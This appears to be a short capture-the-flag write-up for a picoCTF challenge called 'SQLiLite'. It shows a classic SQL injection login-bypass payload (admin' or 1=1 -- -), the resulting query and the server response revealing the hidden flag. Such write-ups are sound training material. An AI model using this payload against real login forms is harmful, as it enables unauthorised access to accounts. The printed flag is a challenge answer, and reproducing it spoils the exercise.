# SQLiLite
Can you login to this website?


#### Hints
- None

### Solution
```bash
SQL query: SELECT * FROM users WHERE name='admin' or 1=1 -- -' AND password='admin' or 1=1 -- -'
```

```bash
<pre>username: admin&#039; or 1=1 -- -
password: admin&#039; or 1=1 -- -
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; or 1=1 -- -&#039; AND password=&#039;admin&#039; or 1=1 -- -&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}</p>
```